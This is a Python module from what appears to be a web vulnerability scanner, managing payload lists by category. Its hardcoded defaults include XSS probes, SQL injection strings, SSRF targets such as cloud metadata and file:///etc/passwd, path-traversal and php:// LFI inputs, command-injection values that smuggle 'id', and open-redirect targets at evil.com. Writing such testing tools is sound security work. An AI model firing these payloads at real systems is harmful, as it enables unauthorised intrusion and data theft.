from typing import Dict, Any, List
import json
import os
from .base import BaseModule

class PayloadManager(BaseModule):
    def __init__(self):
        super().__init__()
        self.payloads: Dict[str, List[str]] = {}
        self.custom_payloads_dir = "data/payloads"
        self._load_payloads()
    
    def run(self, target: str, options: Dict[str, Any]) -> Dict[str, Any]:
        """This module doesn't perform scans, it manages payloads"""
        return {
            'payload_categories': list(self.payloads.keys()),
            'total_payloads': sum(len(payloads) for payloads in self.payloads.values())
        }
    
    def get_payloads(self, category: str) -> List[str]:
        """Get payloads for a specific category"""
        return self.payloads.get(category, [])
    
    def add_payload(self, category: str, payload: str):
        """Add a new payload to a category"""
        if category not in self.payloads:
            self.payloads[category] = []
        
        if payload not in self.payloads[category]:
            self.payloads[category].append(payload)
            self._save_payloads(category)
    
    def remove_payload(self, category: str, payload: str):
        """Remove a payload from a category"""
        if category in self.payloads and payload in self.payloads[category]:
            self.payloads[category].remove(payload)
            self._save_payloads(category)
    
    def _load_payloads(self):
        """Load all payload files"""
        # Create payloads directory if it doesn't exist
        os.makedirs(self.custom_payloads_dir, exist_ok=True)
        
        # Load default payloads
        self._load_default_payloads()
        
        # Load custom payloads
        self._load_custom_payloads()
    
    def _load_default_payloads(self):
        """Load default payloads"""
        default_payloads = {
            'xss': [
                '<script>alert(1)</script>',
                '"><script>alert(1)</script>',
                '"><img src=x onerror=alert(1)>',
                'javascript:alert(1)//',
                '"-prompt(1)-"',
                '<svg/onload=alert(1)>',
                '<img src=x onerror=alert(1)>',
                '<iframe src="javascript:alert(1)">',
                '<body onload=alert(1)>',
                '<details open ontoggle=alert(1)>'
            ],
            'sqli': [
                "' OR '1'='1",
                "1' OR '1'='1",
                "1; SELECT * FROM users--",
                "1' UNION SELECT NULL--",
                "admin' --",
                "admin' #",
                "' OR 1=1--",
                "' OR 'x'='x",
                "1' ORDER BY 1--",
                "1' AND 1=1--"
            ],
            'ssrf': [
                'http://localhost',
                'http://127.0.0.1',
                'http://[::1]',
                'http://169.254.169.254',
                'http://metadata.google.internal',
                'file:///etc/passwd',
                'dict://localhost:11211',
                'gopher://localhost:11211/_',
                'http://0.0.0.0',
                'http://0177.0.0.1'
            ],
            'lfi': [
                '../../../etc/passwd',
                '....//....//....//etc/passwd',
                '/etc/passwd',
                'file:///etc/passwd',
                'php://filter/convert.base64-encode/resource=index.php',
                'php://input',
                'data://text/plain;base64,',
                'expect://id',
                '/proc/self/environ',
                '/var/log/apache2/access.log'
            ],
            'rce': [
                ';id',
                '|id',
                '`id`',
                '$(id)',
                '&&id',
                '||id',
                ';system(\'id\')',
                '|system(\'id\')',
                ';exec(\'id\')',
                '|exec(\'id\')'
            ],
            'open_redirect': [
                'https://evil.com',
                '//evil.com',
                '\/\/evil.com',
                'javascript:alert(1)',
                'data:text/html,<script>alert(1)</script>',
                '\\.evil.com',
                '//google.com@evil.com',
                '//google.com%2F@evil.com',
                '//google.com%5C@evil.com',
                'https:evil.com'
            ]
        }
        
        self.payloads.update(default_payloads)
    
    def _load_custom_payloads(self):
        """Load custom payloads from files"""
        for filename in os.listdir(self.custom_payloads_dir):
            if filename.endswith('.txt'):
                category = filename[:-4]  # Remove .txt extension
                filepath = os.path.join(self.custom_payloads_dir, filename)
                
                try:
                    with open(filepath, 'r') as f:
                        payloads = [line.strip() for line in f if line.strip()]
                        
                    if category not in self.payloads:
                        self.payloads[category] = []
                    
                    self.payloads[category].extend(payloads)
                    
                except Exception as e:
                    self.logger.error(f"Error loading custom payloads from {filename}: {str(e)}")
    
    def _save_payloads(self, category: str):
        """Save payloads to file"""
        filepath = os.path.join(self.custom_payloads_dir, f"{category}.txt")
        
        try:
            with open(filepath, 'w') as f:
                for payload in self.payloads[category]:
                    f.write(f"{payload}\n")
        except Exception as e:
            self.logger.error(f"Error saving payloads to {filepath}: {str(e)}")
    
    def import_payloads(self, filepath: str) -> int:
        """Import payloads from a JSON file"""
        try:
            with open(filepath, 'r') as f:
                new_payloads = json.load(f)
            
            count = 0
            for category, payloads in new_payloads.items():
                if isinstance(payloads, list):
                    if category not in self.payloads:
                        self.payloads[category] = []
                    
                    for payload in payloads:
                        if payload not in self.payloads[category]:
                            self.payloads[category].append(payload)
                            count += 1
                    
                    self._save_payloads(category)
            
            return count
            
        except Exception as e:
            self.logger.error(f"Error importing payloads from {filepath}: {str(e)}")
            return 0
    
    def export_payloads(self, filepath: str):
        """Export payloads to a JSON file"""
        try:
            with open(filepath, 'w') as f:
                json.dump(self.payloads, f, indent=4)
        except Exception as e:
            self.logger.error(f"Error exporting payloads to {filepath}: {str(e)}")
            raise
